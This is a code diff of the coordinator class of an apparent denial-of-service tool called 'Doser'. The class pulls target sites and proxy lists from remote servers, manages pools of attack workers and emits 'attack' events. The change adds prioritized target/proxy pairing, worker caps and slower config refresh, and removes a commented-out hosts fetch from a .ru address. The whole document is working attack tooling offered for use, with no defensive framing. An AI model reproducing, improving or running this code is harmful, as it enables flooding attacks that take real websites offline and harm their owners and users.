@@ -1,23 +1,24 @@
 import { AxiosError } from 'axios-https-proxy-fix'
 import { EventEmitter } from 'events'
-import { DoserEventType, TargetData, ProxyData, SiteData, GetSitesAndProxiesResponse } from './types'
+import { DoserEventType, ProxyData, SiteData, GetSitesAndProxiesResponse, PrioritizedTarget } from './types'
 import { Runner } from './runner'
 import { getSites, getProxies } from './requests'
+import { AxiosProxyConfig } from 'axios'
 
-const CONFIGURATION_INVALIDATION_TIME = 300000
+const CONFIGURATION_INVALIDATION_TIME = 300000*2
+
 
 export class Doser {
   private onlyProxy: boolean
-  private hosts: Array<string> = []
   private working: boolean
   private workers: Runner[] = []
   private numberOfWorkers = 0
   private eventSource: EventEmitter
-  private ddosConfiguration: {
-    updateTime: Date;
-    sites: SiteData[];
-    proxies: ProxyData[];
-  } | null = null
+  private prioritizedPairs: PrioritizedTarget[] = []
+  sites: SiteData[]
+  proxies: ProxyData[]
+  maxPrioritizedWorkers : number = 0
+  prioritizedWorkersNow: number = 0
 
   private verboseError: boolean;
 
@@ -29,6 +30,34 @@ export class Doser {
     this.initialize(numberOfWorkers).catch(error => {
       console.error('Wasnt able to initialize:', error)
     })
+    this.sites = []
+    this.proxies = []
+  }
+
+  getPrioritizedTargets() {
+    return this.prioritizedPairs
+  }
+
+  removePrioritizedTarget(what: SiteData, proxy: AxiosProxyConfig | undefined){
+    for (let index = 0; index < this.prioritizedPairs.length; index++) {
+      const element = this.prioritizedPairs[index];
+      if(element.page == what && JSON.stringify(proxy) === JSON.stringify(element.proxyObj))  {
+        this.prioritizedPairs.splice(index, 1)
+        return
+      }
+      
+    }
+  }
+
+  addPrioritizedTarget(what: SiteData, proxyObj: AxiosProxyConfig | undefined) {
+    if(this.prioritizedPairs.length < this.maxPrioritizedWorkers) { 
+      this.prioritizedPairs.push({
+          page: what,
+          proxyObj: proxyObj
+        }
+      )
+
+    }
   }
 
   private logError (message:string, cause: unknown) {
@@ -42,14 +71,15 @@ export class Doser {
   }
 
   private async initialize (numberOfWorkers: number, attemptNumber = 1): Promise<void> {
-    const config = await this.getSitesAndProxies()
-    if (!config) {
+    await this.getSitesAndProxies()
+    await this.updateSitesAndProxies()
+    if (!this.sites || !this.proxies) {
       console.debug(`Wasnt able to get proxy configuration. Trying for ${attemptNumber} time`)
       return this.initialize(numberOfWorkers, attemptNumber + 1)
     }
-    console.debug('Initialized doser', config)
-    this.updateConfiguration(config)
+    console.debug('Initialized doser', this.sites, this.proxies)
     this.listenForConfigurationUpdates()
+    this.updateConfiguration()
     return this.setWorkersCount(numberOfWorkers)
   }
 
@@ -66,44 +96,49 @@ export class Doser {
     }
   }
 
-  async loadHostsFile () {
-    // const response = await axios.get('http://rockstarbloggers.ru/hosts.json')
-    // this.hosts = response.data as Array<string>
-  }
-
-  private updateConfiguration (configuration: { sites: SiteData[]; proxies: ProxyData[] }) {
-    this.ddosConfiguration = {
-      ...configuration,
-      updateTime: new Date()
-    }
+  private updateConfiguration () {
+    console.debug("CONFIGURATION UPDATED, REMOVING PRIORITIZED TARGETS")
+    this.prioritizedPairs = []
     this.workers.forEach(worker => {
-      worker.updateConfiguration(configuration)
+      worker.stopAddingPrioritized()
     })
   }
 
   private listenForConfigurationUpdates (wasPreviousUpdateSuccessful = true) {
     // eslint-disable-next-line @typescript-eslint/no-misused-promises
     setTimeout(async () => {
-      if (!this.ddosConfiguration) {
-        return this.listenForConfigurationUpdates(false)
-      }
-
-      const config = await this.getSitesAndProxies()
-      if (!config) {
+      await this.updateSitesAndProxies()
+      if (!this.sites || !this.proxies) {
         console.debug('Wasnt able to get configuration updates')
         return this.listenForConfigurationUpdates(false)
       }
-      this.updateConfiguration(config)
+      this.updateConfiguration()
       this.listenForConfigurationUpdates(true)
     }, wasPreviousUpdateSuccessful ? CONFIGURATION_INVALIDATION_TIME : CONFIGURATION_INVALIDATION_TIME / 10)
   }
 
+  async updateSitesAndProxies() {
+    let obj = await this.getSitesAndProxies()
+    if(obj) {
+      this.sites = obj.sites
+      this.proxies = obj.proxies      
+    }
+  }
+
   async getSitesAndProxies (): Promise<GetSitesAndProxiesResponse> {
+    let proxies = undefined
+    let sites = undefined
     while (this.working) { // escaping unavailable hosts
       try {
-        const [proxies, sites] = await Promise.all([getProxies(), getSites()])
-
-        if (proxies.status !== 200 || sites.status !== 200) continue
+        if(proxies == undefined || proxies.status != 200){
+          proxies = await getProxies()
+        }
+        if(sites == undefined || sites.status != 200) {
+          sites = await getSites()
+        }
+        if (proxies == undefined || sites == undefined  || proxies.status != 200  || sites.status != 200) {
+          continue
+        }
 
         return {
           sites: sites.data,
@@ -116,25 +151,8 @@ export class Doser {
     return null
   }
 
-  async getRandomTarget (): Promise<TargetData | null> {
-    while (this.working) { // escaping unavailable hosts
-      try {
-        const [proxies, sites] = await Promise.all([getProxies(), getSites()])
-
-        if (proxies.status !== 200 || sites.status !== 200) continue
-
-        return {
-          site: sites.data[Math.floor(Math.random() * sites.data.length)],
-          proxy: proxies.data
-        }
-      } catch (e) {
-        this.logError('Error while loading hosts', e)
-      }
-    }
-    return null
-  }
-
   setWorkersCount (newCount: number) {
+    this.maxPrioritizedWorkers = Math.floor(newCount / 1.33)
     console.debug(`Updating workers count to ${this.numberOfWorkers} => ${newCount}`)
     if (newCount < this.numberOfWorkers) {
       for (let i = this.numberOfWorkers; i >= newCount; i--) {
@@ -178,13 +196,12 @@ export class Doser {
   private createNewWorker (): Runner {
     console.debug('Creating new worker..')
     // Should never happen
-    if (!this.ddosConfiguration) {
+    if (!this.sites || !this.proxies) {
       throw new Error('Cannot create worker without configuration')
     }
     const worker = new Runner({
-      sites: this.ddosConfiguration.sites,
-      proxies: this.ddosConfiguration.proxies,
-      onlyProxy: this.onlyProxy
+      onlyProxy: this.onlyProxy,
+      doserInstance: this
     })
     worker.eventSource.on('attack', event => {
       this.eventSource.emit('atack', {
